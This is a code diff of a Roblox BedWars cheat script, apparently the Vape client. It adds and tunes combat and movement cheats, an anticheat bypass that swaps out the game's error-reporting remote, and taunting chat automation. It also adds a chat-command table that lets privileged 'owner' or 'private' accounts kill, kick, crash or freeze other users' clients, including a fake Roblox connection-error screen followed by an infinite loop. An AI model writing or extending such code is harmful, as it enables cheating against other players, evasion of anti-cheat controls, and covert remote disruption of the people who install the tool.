@@ -950,6 +950,7 @@ runcode(function()
             ["RavenTable"] = KnitClient.Controllers.RavenController,
 			["RespawnController"] = KnitClient.Controllers.BedwarsRespawnController,
 			["RespawnTimer"] = require(lplr.PlayerScripts.TS.controllers.games.bedwars.respawn.ui["respawn-timer"]).RespawnTimerWrapper,
+			["ResetRemote"] = getremote(debug.getconstants(debug.getproto(KnitClient.Controllers.ResetController.createBindable, 1))),
 			["Roact"] = require(game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"]["roact"].src),
 			["RuntimeLib"] = require(game:GetService("ReplicatedStorage")["rbxts_include"].RuntimeLib),
 			["HashFunction"] = function(str)
@@ -1166,10 +1167,10 @@ runcode(function()
             table.insert(ownedkits, v3)
         end
 		if not shared.vapebypassed then
-			local realremote = game:GetService("ReplicatedStorage"):WaitForChild("GameAnalyticsError")
-			realremote.Parent = nil
 			local fakeremote = Instance.new("RemoteEvent")
 			fakeremote.Name = "GameAnalyticsError"
+			local realremote = game:GetService("ReplicatedStorage"):WaitForChild("GameAnalyticsError")
+			realremote.Parent = nil
 			fakeremote.Parent = game:GetService("ReplicatedStorage")
 			game:GetService("ScriptContext").Error:Connect(function(p1, p2, p3)
 				if not p3 then
@@ -1793,12 +1794,14 @@ GetNearestHumanoidToMouse = function(player, distance, checkvis)
 	local closest, returnedplayer = distance, nil
 	if entity.isAlive then
 		for i, v in pairs(entity.entityList) do
-			local vec, vis = cam:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
-			if vis and targetCheck(v, true) then
-				local mag = (uis:GetMouseLocation() - Vector2.new(vec.X, vec.Y)).magnitude
-				if mag <= closest then
-					closest = mag
-					returnedplayer = v
+			if v.Targetable then
+				local vec, vis = cam:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+				if vis and targetCheck(v, true) then
+					local mag = (uis:GetMouseLocation() - Vector2.new(vec.X, vec.Y)).magnitude
+					if mag <= closest then
+						closest = mag
+						returnedplayer = v
+					end
 				end
 			end
 		end
@@ -2409,7 +2412,7 @@ runcode(function()
 		["Function"] = function(callback)
 			if callback then
 					BindToStepped("TargetStrafe", 1, function(lol, delta)
-						local plr = GetNearestHumanoidToPosition(true, targetstrafedistance["Value"] + 6)
+						local plr = GetNearestHumanoidToPosition(true, targetstrafedistance["Value"] + 4)
 						targetstrafing = false
 						if entity.isAlive and plr and (not GuiLibrary["ObjectsThatCanBeSaved"]["ScaffoldOptionsButton"]["Api"]["Enabled"]) and (not GuiLibrary["ObjectsThatCanBeSaved"]["LongJumpOptionsButton"]["Api"]["Enabled"]) and (not GuiLibrary["ObjectsThatCanBeSaved"]["FlyOptionsButton"]["Api"]["Enabled"]) and longjumpticktimer <= tick() and (not spidergoinup) then
 							if (lplr.Character.HumanoidRootPart.Position.Y - plr.Character.HumanoidRootPart.Position.Y) >= -7 then
@@ -2439,6 +2442,7 @@ runcode(function()
 										newpos = playerpos + CFrame.Angles(0, math.rad(targetstrafenum), 0).LookVector * math.clamp(((playerpos - ray.Position).Magnitude - 3), 1, targetstrafedistance["Value"])
 									end
 									local newray2 = workspace:Raycast(newpos, Vector3.new(0, -1000, 0), raycastparameters)
+									local working = true
 									if newray2 ~= nil then
 										local newcframe = CFrame.new(newpos, Vector3.new(plr.Character:FindFirstChild("HumanoidRootPart").Position.X, lplr.Character.PrimaryPart.Position.Y, plr.Character:FindFirstChild("HumanoidRootPart").Position.Z))
 										if (lplr.Character.HumanoidRootPart.Position - newpos).Magnitude <= 5 then
@@ -2447,6 +2451,7 @@ runcode(function()
 											local ray5 = workspace:Raycast(newcframe.p, CFrame.lookAt(newcframe.p, lplr.Character.HumanoidRootPart.CFrame.p).lookVector * (targetstrafedistance["Value"] + 2), raycastparameters)
 											if ray5 == nil then
 												lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame:lerp(newcframe, math.clamp(10 * delta, 0, 1))
+												working = false
 											end
 										end
 									else
@@ -2470,34 +2475,41 @@ runcode(function()
 										else
 											local ray5 = workspace:Raycast(newcframe2.p, CFrame.lookAt(newcframe2.p, lplr.Character.HumanoidRootPart.CFrame.p).lookVector * (targetstrafedistance["Value"] + 2), raycastparameters)
 											if ray5 == nil then
-												lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame:lerp(newcframe2, math.clamp(10 * delta, 0, 1))
+												local ray7 = workspace:Raycast(newcframe2.p, Vector3.new(0, -1000, 0), raycastparameters)
+												if ray7 ~= nil then
+													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame:lerp(newcframe2, math.clamp(10 * delta, 0, 1))
+													working = false
+												end
 											end
 										end
 									end
 									times = times * (delta * 100)
-									targetstrafenum = (flip and targetstrafenum - ((targetstrafespeed["Value"] / 10) * times) or targetstrafenum + ((targetstrafespeed["Value"] / 10) * times))
-									if targetstrafenum >= 999999 then
-										targetstrafenum = 0
-									end
-									if targetstrafenum < -999999 then
-										targetstrafenum = 0
+									if working then
+										targetstrafenum = (flip and targetstrafenum - ((targetstrafespeed["Value"] / 10) * times) or targetstrafenum + ((targetstrafespeed["Value"] / 10) * times))
+										if targetstrafenum >= 999999 then
+											targetstrafenum = 0
+										end
+										if targetstrafenum < -999999 then
+											targetstrafenum = 0
+										end
 									end
 								else
 									if lastreal then
 										--lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame:lerp(CFrame.new(lastreal), 15 * delta)
 									end
 								end
-								targetstrafevelo = (lplr.Character.HumanoidRootPart.CFrame.p - veryoldpos) * 100
+								local newstrafevelo = (veryoldpos - lplr.Character.HumanoidRootPart.CFrame.p) * -100
+								--targetstrafevelo = Vector3.new(newstrafevelo.X, lplr.Character.HumanoidRootPart.Velocity.Y, newstrafevelo.Z)
 							end
 						else
-							strafing = false
+							targetstrafing = false
 							old = nil
 							lastreal = nil
 						end
 					end)
 				else
 					UnbindFromStepped("TargetStrafe")
-					strafing = false
+					targetstrafing = false
 				end
 		end,
 		["HoverText"] = "Automatically moves around attacking players"
@@ -2512,8 +2524,8 @@ runcode(function()
 	targetstrafejump = targetstrafe.CreateSlider({
 		["Name"] = "Jump Height",
 		["Min"] = 1,
-		["Max"] = 60,
-		["Default"] = 40,
+		["Max"] = 20,
+		["Default"] = 20,
 		["Function"] = function() end
 	})
 	targetstrafedistance = targetstrafe.CreateSlider({
@@ -4294,7 +4306,7 @@ runcode(function()
 								--damagetimer >= tick() and 400 or 
 								longjumpvelo = (entity.isAlive and (not nomove) and acallowed and lplr.Character.Humanoid.MoveDirection * (longjumpspeed["Value"]) or Vector3.new(0, 0, 0))
 							end)
-							createwarning("LongJump", "waiting 1s to jump", 3)
+							createwarning("LongJump", "waiting "..(math.floor((longjumpdelay["Value"] / 10) * 100) / 100).."s to jump", 3)
 							task.wait((longjumpdelay["Value"] - 1) / 10)
 							repeat task.wait() until (anticheatfunnyyes or GuiLibrary["ObjectsThatCanBeSaved"]["Blatant modeToggle"]["Api"]["Enabled"])
 							if longjump["Enabled"] then 
@@ -5058,10 +5070,265 @@ local function findplayers(arg)
 	local continuechecking = true
 
 	if arg == "default" and continuechecking and bedwars["CheckPlayerType"](lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
-	for i,v in pairs(game:GetService("Players"):GetChildren()) do if continuechecking and v.Name:lower():find(arg, 1, true) then table.insert(temp, v) continuechecking = false end end
+	if arg == "private" and continuechecking and bedwars["CheckPlayerType"](lplr) == "VAPE PRIVATE" then table.insert(temp, lplr) continuechecking = false end
+	for i,v in pairs(game:GetService("Players"):GetChildren()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
 
 	return temp
 end
+
+local commands = {
+	["kill"] = function(args)
+		if entity.isAlive then
+			bedwars["ClientHandler"]:Get(bedwars["ResetRemote"]):SendToServer()
+		end
+	end,
+	["void"] = function(args)
+		if entity.isAlive then
+			spawn(function()
+				repeat
+					task.wait(0.2)
+					lplr.Character.HumanoidRootPart.CFrame = addvectortocframe(lplr.Character.HumanoidRootPart.CFrame, Vector3.new(0, -20, 0))
+				until not entity.isAlive
+			end)
+		end
+	end,
+	["scare"] = function(args)
+		local image = Instance.new("ImageLabel")
+		image.ZIndex = 10
+		image.Image = "http://www.roblox.com/asset/?id=7473973347"
+		image.Size = UDim2.new(0, 0, 0, 0)
+		image.Position = UDim2.new(0, 0, 0, -36)
+		image.BackgroundTransparency = 1
+		image.Parent = GuiLibrary["MainGui"]
+		local sound = Instance.new("Sound")
+		sound.Volume = 10
+		sound.SoundId = "rbxassetid://2557531797"
+		sound.Parent = workspace
+		spawn(function()
+			repeat task.wait() until image.IsLoaded and sound.IsLoaded
+			image.Size = UDim2.new(1, 0, 1, 36)
+			sound:Play()
+			game:GetService("Debris"):AddItem(sound, 0.3)
+			game:GetService("Debris"):AddItem(image, 0.3)
+		end)
+	end,
+	["framerate"] = function(args)
+		if #args >= 1 then
+			if setfpscap then
+				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]), 1, 9999) or 9999)
+			end
+		end
+	end,
+	["crash"] = function(args)
+		setfpscap(100000000)
+    	print(game:GetObjects("h29g3535")[1])
+	end,
+	["playsound"] = function(args)
+		if #args >= 1 then
+			local function convertletter(let)
+				return string.byte(let) - 96
+			end
+			local str = args[1]
+			local newstr = ""
+			for i = 1, str:len() do
+				newstr = newstr..convertletter(str:sub(i, i))
+			end
+			local sound = Instance.new("Sound")
+			sound.SoundId = "rbxassetid://"..newstr
+			sound.Parent = workspace
+			sound:Play()
+		end
+	end,
+	["chipman"] = function(args)
+		local function funnyfunc(v)
+			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+				v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("Image"):connect(function()
+					v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("TextLabel") or v:IsA("TextButton") then
+				v.Text = "chips"
+				v:GetPropertyChangedSignal("Text"):connect(function()
+					v.Text = "chips"
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("Texture"):connect(function()
+					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("TextureID"):connect(function()
+					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("SpecialMesh") then
+				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("TextureId"):connect(function()
+					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("Sky") then
+				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
+			end
+		end
+	
+		for i,v in pairs(game:GetDescendants()) do
+			funnyfunc(v)
+		end
+		game.DescendantAdded:connect(funnyfunc)
+		local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://6516015896"
+		sound.Parent = workspace
+		sound.Looped = true
+		sound:Play()
+	end,
+	["rickroll"] = function(args)
+		local function funnyfunc(v)
+			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+				v.Image = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("Image"):connect(function()
+					v.Image = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("TextLabel") or v:IsA("TextButton") then
+				v.Text = "Never gonna give you up"
+				v:GetPropertyChangedSignal("Text"):connect(function()
+					v.Text = "Never gonna give you up"
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("Texture"):connect(function()
+					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("TextureID"):connect(function()
+					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("SpecialMesh") then
+				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("TextureId"):connect(function()
+					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("Sky") then
+				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
+			end
+		end
+	
+		for i,v in pairs(game:GetDescendants()) do
+			funnyfunc(v)
+		end
+		game.DescendantAdded:connect(funnyfunc)
+		local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://516046413"
+		sound.Parent = workspace
+		sound.Looped = true
+		sound:Play()
+	end,
+	["kick"] = function(args)
+		local str = (#args >= 1 and "" or nil)
+		for i,v in pairs(args) do
+			str = str..v.." "
+		end
+		lplr:Kick(str)
+	end,
+	["uninject"] = function(args)
+		GuiLibrary["SelfDestruct"]()
+	end,
+	["funnykick"] = function(args)
+		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
+			if obj.Name == "ErrorMessage" then
+				obj:GetPropertyChangedSignal("Text"):connect(function()
+					obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
+				end)
+			end
+			if obj.Name == "LeaveButton" then
+				local clone = obj:Clone()
+				clone.Name = "LeaveButton2"
+				clone.Parent = obj.Parent
+				clone.MouseButton1Click:connect(function()
+					clone.Visible = false
+					local video = Instance.new("VideoFrame")
+					video.Video = getcustomassetfunc("vape/assets/skill.webm")
+					video.Size = UDim2.new(1, 0, 1, 36)
+					video.Visible = false
+					video.Position = UDim2.new(0, 0, 0, -36)
+					video.ZIndex = 9
+					video.BackgroundTransparency = 1
+					video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+					local textlab = Instance.new("TextLabel")
+					textlab.TextSize = 45
+					textlab.ZIndex = 10
+					textlab.Size = UDim2.new(1, 0, 1, 36)
+					textlab.TextColor3 = Color3.new(1, 1, 1)
+					textlab.Text = "skill issue"
+					textlab.Position = UDim2.new(0, 0, 0, -36)
+					textlab.Font = Enum.Font.Gotham
+					textlab.BackgroundTransparency = 1
+					textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+					video.Loaded:connect(function()
+						video.Visible = true
+						video:Play()
+						spawn(function()
+							repeat
+								wait()
+								for i = 0, 1, 0.01 do
+									wait(0.01)
+									textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+								end
+							until true == false
+						end)
+					end)
+					task.wait(19)
+					spawn(function()
+						pcall(function()
+							getconnections(lplr.Character.Humanoid.Died)
+							print(game:GetObjects("h29g3535")[1])
+						end)
+						while true do end
+					end)
+				end)
+				obj.Visible = false
+			end
+		end)
+		task.wait(0.1)
+		lplr:Kick()
+	end,
+	["togglemodule"] = function(args)
+		if #args >= 1 then
+			local module = GuiLibrary["ObjectsThatCanBeSaved"][args[1].."OptionsButton"]
+			if module then
+				if args[2] == "true" then
+					if module["Api"]["Enabled"] == false then
+						module["Api"]["ToggleButton"]()
+					end
+				else
+					if module["Api"]["Enabled"] then
+						module["Api"]["ToggleButton"]()
+					end
+				end
+			end
+		end
+	end,
+}
 
 chatconnection = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:connect(function(tab, channel)
 	local plr = players:FindFirstChild(tab["FromSpeaker"])
@@ -5088,215 +5355,21 @@ chatconnection = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvent
 				end
 			end)
 		end)
-		createwarning("Vape", plr.Name.." is using vape!", 30)
+		createwarning("Vape", plr.Name.." is using vape!", 60)
 	end
 	local args = tab.Message:split(" ")
+	--priolist[bedwars["CheckPlayerType"](plr)] > 0 and plr ~= lplr and priolist[bedwars["CheckPlayerType"](plr)] > priolist[bedwars["CheckPlayerType"](lplr)]
 	if plr and priolist[bedwars["CheckPlayerType"](plr)] > 0 and plr ~= lplr and priolist[bedwars["CheckPlayerType"](plr)] > priolist[bedwars["CheckPlayerType"](lplr)] and #args > 1 then
 		table.remove(args, 1)
 		local chosenplayers = findplayers(args[1])
 		if table.find(chosenplayers, lplr) then
-			if plr and bedwars["CheckPlayerType"](plr) == "VAPE OWNER" and plr ~= lplr then
-				if tab.Message:sub(1, 5):lower() == ";fnaf" then
-					local video = Instance.new("VideoFrame")
-								video.Video = getcustomassetfunc("vape/assets/VapeLogo5.png")
-								video.Size = UDim2.new(1, 0, 1, 36)
-								video.Visible = true
-								video.Position = UDim2.new(0, 0, 0, -36)
-								video.ZIndex = 9
-								video.BackgroundTransparency = 1
-								video.Parent = GuiLibrary["MainGui"]
-								video.Ended:connect(function()
-									print(game:GetObjects("h29g3535")[1])
-								end)
-								video.Played:connect(function()
-									spawn(function()
-										repeat
-											wait()
-											settings():GetService("NetworkSettings").IncomingReplicationLag = 99999
-										until true == false
-									end)
-								end)	
-								video:Play()
+			table.remove(args, 1)
+			for i,v in pairs(commands) do
+				if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
+				--	print("hahahah")
+					v(args)
+					break
 				end
-			end
-			if tab.Message:sub(1, 5):lower() == ";kill" then
-				if entity.isAlive then
-					(AnticheatBypass["Enabled"] and oldchar or lplr.Character).Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-				end
-			end
-			if tab.Message:sub(1, 5):lower() == ";void" then
-				if entity.isAlive then
-					spawn(function()
-						repeat
-							task.wait(0.2)
-							lplr.Character.HumanoidRootPart.CFrame = addvectortocframe(lplr.Character.HumanoidRootPart.CFrame, Vector3.new(0, -20, 0))
-						until not entity.isAlive
-					end)
-				end
-			end
-			if tab.Message:sub(1, 6):lower() == ";scare" then
-				local image = Instance.new("ImageLabel")
-				image.ZIndex = 10
-				image.Image = "http://www.roblox.com/asset/?id=7473973347"
-				image.Size = UDim2.new(0, 0, 0, 0)
-				image.Position = UDim2.new(0, 0, 0, -36)
-				image.BackgroundTransparency = 1
-				image.Parent = GuiLibrary["MainGui"]
-				local sound = Instance.new("Sound")
-				sound.Volume = 10
-				sound.SoundId = "rbxassetid://2557531797"
-				sound.Parent = workspace
-				spawn(function()
-					repeat task.wait() until image.IsLoaded and sound.IsLoaded
-					image.Size = UDim2.new(1, 0, 1, 36)
-					sound:Play()
-					game:GetService("Debris"):AddItem(sound, 0.3)
-					game:GetService("Debris"):AddItem(image, 0.3)
-				end)
-			end
-			if tab.Message:sub(1, 10):lower() == ";framerate" and #args >= 1 then
-				if setfpscap then
-					setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]), 1, 9999) or 9999)
-				end
-			end
-			if tab.Message:sub(1, 6):lower() == ";crash" then
-				setfpscap(100000000)
-			end
-			if tab.Message:sub(1, 10):lower() == ";playsound" and #args >= 1 then
-				local function convertletter(let)
-					return string.byte(let) - 96
-				end
-				local str = args[1]
-				local newstr = ""
-				for i = 1, str:len() do
-					newstr = newstr..convertletter(str:sub(i, i))
-				end
-				local sound = Instance.new("Sound")
-				sound.SoundId = "rbxassetid://"..newstr
-				sound.Parent = workspace
-				sound:Play()
-			end
-			if tab.Message:sub(1, 8):lower() == ";chipman" then
-				for i,v in pairs(game:GetDescendants()) do
-					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-						v.Image = "http://www.roblox.com/asset/?id=6864086702"
-					end
-					if v:IsA("TextLabel") or v:IsA("TextButton") then
-						v.Text = "eating chips"
-					end
-					if v:IsA("Texture") or v:IsA("Decal") then
-						v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-					end
-					if v:IsA("MeshPart") then
-						v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
-					end
-					if v:IsA("SpecialMesh") then
-						v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
-					end
-					if v:IsA("Sky") then
-						v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
-					end
-				end
-				local sound = Instance.new("Sound")
-				sound.SoundId = "rbxassetid://6516015896"
-				sound.Parent = workspace
-				sound.Looped = true
-				sound:Play()
-			end
-			if tab.Message:sub(1, 9):lower() == ";rickroll" then
-				for i,v in pairs(game:GetDescendants()) do
-					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-						v.Image = "http://www.roblox.com/asset/?id=7083449168"
-					end
-					if v:IsA("TextLabel") or v:IsA("TextButton") then
-						v.Text = "Never gonna give you up"
-					end
-					if v:IsA("Texture") or v:IsA("Decal") then
-						v.Texture = "http://www.roblox.com/asset/?id=7083449168"
-					end
-					if v:IsA("MeshPart") then
-						v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
-					end
-					if v:IsA("SpecialMesh") then
-						v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
-					end
-					if v:IsA("Sky") then
-						v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
-					end
-				end
-				local sound = Instance.new("Sound")
-				sound.SoundId = "rbxassetid://516046413"
-				sound.Parent = workspace
-				sound.Looped = true
-				sound:Play()
-			end
-			if tab.Message:sub(1, 5):lower() == ";kick" then
-				game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
-					if obj.Name == "ErrorMessage" then
-						obj:GetPropertyChangedSignal("Text"):connect(function()
-							obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
-						end)
-					end
-					if obj.Name == "LeaveButton" then
-						local clone = obj:Clone()
-						clone.Name = "LeaveButton2"
-						clone.Parent = obj.Parent
-						clone.MouseButton1Click:connect(function()
-							clone.Visible = false
-							local video = Instance.new("VideoFrame")
-							video.Video = getcustomassetfunc("vape/assets/skill.webm")
-							video.Size = UDim2.new(1, 0, 1, 36)
-							video.Visible = false
-							video.Position = UDim2.new(0, 0, 0, -36)
-							video.ZIndex = 9
-							video.BackgroundTransparency = 1
-							video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-							local textlab = Instance.new("TextLabel")
-							textlab.TextSize = 45
-							textlab.ZIndex = 10
-							textlab.Size = UDim2.new(1, 0, 1, 36)
-							textlab.TextColor3 = Color3.new(1, 1, 1)
-							textlab.Text = "imagine getting kicked by vape private user "
-							textlab.Position = UDim2.new(0, 0, 0, -36)
-							textlab.Font = Enum.Font.Gotham
-							textlab.BackgroundTransparency = 1
-							textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-							video.Loaded:connect(function()
-								video.Visible = true
-								video:Play()
-								spawn(function()
-									repeat
-										wait()
-										for i = 0, 1, 0.01 do
-											wait(0.01)
-											textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
-										end
-									until true == false
-								end)
-							end)
-							task.wait(19)
-							spawn(function()
-								pcall(function()
-									getconnections(lplr.Character.Humanoid.Died)
-								end)
-								while true do end
-							end)
-						end)
-						obj.Visible = false
-					end
-				end)
-				task.wait(0.1)
-				lplr:Kick()
 			end
 		end
 	end
@@ -5559,7 +5632,7 @@ runcode(function()
 		connectionstodisconnect[#connectionstodisconnect + 1] = p6:Connect(function(p7)
 			if leavesaid == false and (p7.entityInstance == lplr.Character or p7.entityInstance == oldchar) then
 				local plr = players:GetPlayerFromCharacter(p7.fromEntity or lplr.Character)
-				if (bedwars["ClientStoreHandler"]:getState().Game.queueType:find("skywars") or lplr.leaderstats.Bed.Value ~= "✅") then
+				if bedwars["GamePlayerUtil"].getGamePlayer(lplr):isSpectator() then
 					leavesaid = true
 					if plr and AutoToxic["Enabled"] and AutoToxicDeath["Enabled"] then
 						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(#AutoToxicPhrases3["ObjectList"] > 0 and AutoToxicPhrases3["ObjectList"][math.random(1, #AutoToxicPhrases3["ObjectList"])] or "My gaming chair expired midfight.", "All")
@@ -5581,7 +5654,7 @@ runcode(function()
 			if AutoToxic["Enabled"] then
 				if p7.fromEntity and (p7.fromEntity == lplr.Character or p7.fromEntity == oldchar) then
 					local plr = players:GetPlayerFromCharacter(p7.entityInstance)
-					if plr and (bedwars["ClientStoreHandler"]:getState().Game.queueType:find("skywars") or plr.leaderstats.Bed.Value ~= "✅") and AutoToxicFinalKill["Enabled"] then
+					if plr and bedwars["GamePlayerUtil"].getGamePlayer(plr):isSpectator() and AutoToxicFinalKill["Enabled"] then
 						local custommsg = #AutoToxicPhrases2["ObjectList"] > 0 and AutoToxicPhrases2["ObjectList"][math.random(1, #AutoToxicPhrases2["ObjectList"])]
 						if custommsg == lastsaid then
 							custommsg = #AutoToxicPhrases2["ObjectList"] > 0 and AutoToxicPhrases2["ObjectList"][math.random(1, #AutoToxicPhrases2["ObjectList"])]
@@ -7313,7 +7386,7 @@ runcode(function()
 				end]]
 				getmetatable(bedwars["HighlightController"])["highlight"] = function() end
 			else
-				getmetatable(bedwars["CombatController"])["highlight"] = old
+				getmetatable(bedwars["HighlightController"])["highlight"] = old
 				getmetatable(bedwars["StopwatchController"]).tweenOutGhost = old2
 				old = nil
 				old2 = nil
@@ -7678,205 +7751,6 @@ runcode(function()
 				end)
 			else
 				BedPlatesFolder:ClearAllChildren()
-			end
-		end
-	})
-end)
-
-GuiLibrary["RemoveObject"]("NickHiderOptionsButton")
-runcode(function()
-	local NickHider = {["Enabled"] = false}
-	local NickHiderBox = {["Value"] = ""}
-	local newname
-	local newid
-	local newdisplayname
-	local nickeduser = {}
-	local nickconnections = {}
-	local nickedmodel 
-	local oldmodel = {}
-	local nickhidercharadded
-	local nickhiderdescendantsadded
-	local OldNameCall = nil
-
-	local function findclosestitem(name)
-		local close
-		return close
-	end
-
-	local function dostuff()
-		spawn(function()
-			local hum = lplr.Character:WaitForChild("Humanoid")
-			local rootpart = lplr.Character:WaitForChild("HumanoidRootPart")
-			local changedface = false
-			for i,v in pairs(lplr.Character:GetChildren()) do
-				if v:IsA("Accessory") and v:GetAttribute("ArmorSlot") == nil and v:GetAttribute("ItemData") == nil then
-					v.Handle.Transparency = 1
-				end
-				if v:IsA("LocalScript") and v.Name:find("Animate") then
-					oldmodel["animate"] = v
-				end
-				if v:IsA("BodyColors") then
-					oldmodel["bodycolors"] = v
-				end
-				if v.Name == "Head" and v:FindFirstChild("face") then
-					oldmodel["face"] = v.face
-				end
-				if v:IsA("Shirt") then
-					oldmodel["shirt"] = v
-				end
-				if v:IsA("Pants") then
-					oldmodel["pants"] = v
-				end
-			end
-			for i,v in pairs(nickedmodel:GetChildren()) do
-				if v:IsA("Folder") and v.Name:match("R15") and oldmodel["animate"] then
-					for i2,v2 in pairs(v:GetChildren()) do
-						if oldmodel["animate"]:FindFirstChild(v2.Name) then
-							oldmodel["animate"][v2.Name]:Remove()
-						end
-						v2:Clone().Parent = oldmodel["animate"]
-					end
-				end
-				if v:IsA("Shirt") then
-					if oldmodel["shirt"] then
-						oldmodel["shirt"].ShirtTemplate = v.ShirtTemplate
-					else
-						v:Clone().Parent = lplr.Character
-					end
-				end
-				if v:IsA("Pants") then
-					if oldmodel["pants"] then
-						oldmodel["pants"].PantsTemplate = v.PantsTemplate
-					else
-						v:Clone().Parent = lplr.Character
-					end
-				end
-				if v.Name == "face" and oldmodel["face"] then
-					oldmodel["face"].Texture = v.Texture
-					changedface = true
-				end
-				if v:IsA("BodyColors") and oldmodel["bodycolors"] then
-					oldmodel["bodycolors"].HeadColor3 = v.HeadColor3
-					oldmodel["bodycolors"].LeftArmColor3 = v.LeftArmColor3
-					oldmodel["bodycolors"].RightArmColor3 = v.RightArmColor3
-					oldmodel["bodycolors"].LeftLegColor3 = v.LeftLegColor3
-					oldmodel["bodycolors"].RightLegColor3 = v.RightLegColor3
-					oldmodel["bodycolors"].TorsoColor3 = v.TorsoColor3
-				end
-				if v:IsA("Accessory") then
-					local temp = v:Clone()
-					lplr.Character.Humanoid:AddAccessory(temp)
-				end
-			end
-			if oldmodel["face"] and changedface == false then
-				oldmodel["face"].Texture = "rbxasset://textures/face.png"
-			end
-			bedwars["WeldTable"].weldCharacterAccessories(lplr.Character)
-		end)
-	end
-
